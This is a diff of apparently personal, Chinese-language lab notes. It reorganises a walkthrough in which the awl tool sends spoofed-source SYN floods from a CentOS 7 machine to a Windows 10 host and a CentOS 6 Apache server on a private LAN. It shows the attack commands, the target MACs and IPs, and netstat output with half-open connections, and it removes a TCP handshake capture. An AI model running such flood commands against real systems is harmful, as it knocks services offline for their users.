@@ -343,127 +343,67 @@ traceroute to naver.com (125.209.222.141), 30 hops max, 60 byte packets
   - d 被攻击机器的IP
   - p 被攻击机器的端口
 - 开始攻击
-  ```
-  [root@localhost ~]# ping 192.168.1.64
+  1. centos7 attack win10
+    ```
+    [root@localhost ~]# arp -n     #   获取对方的IP地址解析成MAC地址
+    Address                  HWtype  HWaddress           Flags Mask            Iface
+    192.168.0.219            ether   bc:85:56:bb:8f:03   C                     ens33
+    192.168.0.1              ether   90:6c:ac:b3:0b:c4   C                     ens33
 
-  [root@localhost ~]# arp -n     #   获取对方的IP地址解析成MAC地址
-  Address                  HWtype  HWaddress           Flags Mask            Iface
-  192.168.0.219            ether   bc:85:56:bb:8f:03   C                     ens33
-  192.168.0.1              ether   90:6c:ac:b3:0b:c4   C                     ens33
 
+    [root@localhost ~]# awl -i ens33 -m bc:85:56:bb:8f:03 -d 192.168.0.219 -p 80
+
+    [root@localhost64 ~]# netstat -anutp | grep 80        # 在localhost64上查看：发现很多伪装成公网的IP在攻击
+    C:\Users\xerox>netstat                                # windows
+
+    활성 연결
+
+      프로토콜  로컬 주소           외부 주소              상태
+      TCP    127.0.0.1:1641         DESKTOP-7ET6EKR:5939   ESTABLISHED
+      TCP    127.0.0.1:1838         DESKTOP-7ET6EKR:1839   ESTABLISHED
+      TCP    127.0.0.1:1839         DESKTOP-7ET6EKR:1838   ESTABLISHED
+      TCP    192.168.0.219:1796     113.96.208.198:8080    ESTABLISHED
+      TCP    192.168.0.219:1799     183.232.103.146:8080   ESTABLISHED
+      TCP    192.168.0.219:4468     203.205.146.16:http    ESTABLISHED
+      TCP    192.168.0.219:4622     221.228.75.150:9203    ESTABLISHED
+      TCP    192.168.0.219:4737     192.168.0.162:ssh      ESTABLISHED
+      TCP    192.168.0.219:4981     203.205.151.45:https   CLOSE_WAIT
+      TCP    192.168.0.219:5302     203.205.219.54:http    CLOSE_WAIT
+      TCP    192.168.0.219:5514     161.202.224.155:8080   CLOSE_WAIT
+      TCP    192.168.0.219:5517     203.205.158.52:http    CLOSE_WAIT
+    ```
+    ![](https://i.loli.net/2019/03/04/5c7ceb298bef9.png)
   
-  [root@localhost ~]# awl -i ens33 -m bc:85:56:bb:8f:03 -d 192.168.0.219 -p 80
-  
-  [root@localhost64 ~]# netstat -anutp | grep 80        # 在localhost64上查看：发现很多伪装成公网的IP在攻击
-  C:\Users\xerox>netstat                                # windows
+  2. centos7 attack cenos6(httpd installed)
 
-  활성 연결
+    - centos6
+      ```
+      yum -y install httpd
+      service httpd status
+      service httpd restart
+      ```
+    - centos7
+      ```
+      [root@localhost ~]# awl -i ens33 -m 00:0c:29:08:86:b8 -d 192.168.0.11 -p 80
+      ^Cpool_renew success
+      pthread join 0 is success !
+      pthread join 1 is success !
+      pthread join 2 is success !
+      pthread join 3 is success !
+      pthread join 4 is success !
+      pthread join 5 is success !
+      pthread join 6 is success !
+      pthread join 7 is success !
+      ```
+    - go back to cenos6
+      ```
+      netstat -anutp | grep 80
 
-    프로토콜  로컬 주소           외부 주소              상태
-    TCP    127.0.0.1:1641         DESKTOP-7ET6EKR:5939   ESTABLISHED
-    TCP    127.0.0.1:1838         DESKTOP-7ET6EKR:1839   ESTABLISHED
-    TCP    127.0.0.1:1839         DESKTOP-7ET6EKR:1838   ESTABLISHED
-    TCP    127.0.0.1:1882         DESKTOP-7ET6EKR:1883   ESTABLISHED
-    TCP    127.0.0.1:1883         DESKTOP-7ET6EKR:1882   ESTABLISHED
-    TCP    127.0.0.1:5939         DESKTOP-7ET6EKR:1641   ESTABLISHED
-    TCP    192.168.0.219:445      KORSD09F2JPBXE:53002   ESTABLISHED
-    TCP    192.168.0.219:1796     113.96.208.198:8080    ESTABLISHED
-    TCP    192.168.0.219:1799     183.232.103.146:8080   ESTABLISHED
-    TCP    192.168.0.219:1837     213.227.170.135:https  ESTABLISHED
-    TCP    192.168.0.219:1849     52.230.3.194:https     ESTABLISHED
-    TCP    192.168.0.219:4468     203.205.146.16:http    ESTABLISHED
-    TCP    192.168.0.219:4622     221.228.75.150:9203    ESTABLISHED
-    TCP    192.168.0.219:4737     192.168.0.162:ssh      ESTABLISHED
-    TCP    192.168.0.219:4981     203.205.151.45:https   CLOSE_WAIT
-    TCP    192.168.0.219:5302     203.205.219.54:http    CLOSE_WAIT
-    TCP    192.168.0.219:5514     161.202.224.155:8080   CLOSE_WAIT
-    TCP    192.168.0.219:5517     203.205.158.52:http    CLOSE_WAIT
-  ```
-  ![](https://i.loli.net/2019/03/04/5c7ceb298bef9.png)
-  
-  
-  -----
-  
-# TCP 握手
+      tcp        0      0 192.168.0.11:80             162.180.33.66:30350         SYN_RECV    -                   
+      tcp        0      0 192.168.0.11:80             55.224.253.41:42381         SYN_RECV    -                   
+      tcp        0      0 192.168.0.11:80             1.44.16.75:33147            SYN_RECV    -                   
+      tcp        0      0 192.168.0.11:80             68.126.169.58:49177         SYN_RECV    -                   
+      tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      2800/master         
+      tcp        0      0 :::80                       :::*                        LISTEN      3811/httpd          
 
-
-> i. centos7 ssh to centos 6. ssh: connect to host 192.168.0.11 port 22: Connection refused
-
-1. go to centos6
-```
-[root@localhost ~]# service iptables stop
-[root@localhost ~]# service iptables status
-iptables：未运行防火墙。                            # still cannot ssh
-
-[root@localhost ~]# /etc/init.d/sshd restart
-停止 sshd：                                               [失败]
-生成 SSH2 RSA 主机键：                                     [确定]
-生成 SSH1 RSA 主机键：                                     [确定]
-正在生成 SSH2 DSA 主机键：                                  [确定]
-正在启动 sshd：                                            [确定]
-```
-2.  go to centos7
-run in one cmd
-```
-[root@localhost ~]# tcpdump -n -c 3 port 22 -S -i ens33
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
-
-```
-run in another cmd
-```
-[root@localhost ~]# ssh root@192.168.0.11
-root@192.168.0.11's password:               # stop here with no pw input
-
-```
-go to the first cmd
-```
-[root@localhost ~]# tcpdump -n -c 3 port 22 -S -i ens33
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
-00:51:19.157928 IP 192.168.0.100.33722 > 192.168.0.11.ssh: Flags [S], seq 2296476984, win 29200, options [mss 1460,sackOK,TS val 596461 ecr 0,nop,wscale 7], length 0
-
-00:51:19.158427 IP 192.168.0.11.ssh > 192.168.0.100.33722: Flags [S.], seq 2783925694, ack 2296476985, win 14480, options [mss 1460,sackOK,TS val 489701 ecr 596461,nop,wscale 7], length 0
-
-00:51:19.158475 IP 192.168.0.100.33722 > 192.168.0.11.ssh: Flags [.], ack 2783925695, win 229, options [nop,nop,TS val 596462 ecr 489701], length 0
-3 packets captured
-3 packets received by filter
-0 packets dropped by kernel
-```
-- seq 2296476984 -> ack 2296476985
-- seq 2783925694 -> ack 2783925695
-
-
-
-# 洪水攻击
-1. centos6
-```
-yum -y install httpd
-service httpd status
-service httpd restart
-```
-2. centos7
-```
-[root@localhost ~]# awl -i ens33 -m 00:0c:29:08:86:b8 -d 192.168.0.11 -p 80
-^Cpool_renew success
-pthread join 0 is success !
-pthread join 1 is success !
-pthread join 2 is success !
-pthread join 3 is success !
-pthread join 4 is success !
-pthread join 5 is success !
-pthread join 6 is success !
-pthread join 7 is success !
-```
-3. go back to cenos6
-```
-netstat -anutp | grep 80
-
-tcp        0      0 192.168.0.11:80             162.180.33.66:30350         SYN_RECV    -                   
-tcp        0      0 192.168.0.11:80             55.224.253.41:42381         SYN_RECV    -                   
-tcp        0      0 192.168.0.11:80             1.44.16.75:33147            SYN_RECV    -                   
-tcp        0      0 192.168.0.11:80             68.126.169.58:49177         SYN_RECV    -                   
-tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      2800/master         
-tcp        0      0 :::80                       :::*                        LISTEN      3811/httpd          
-
-```
+      ```
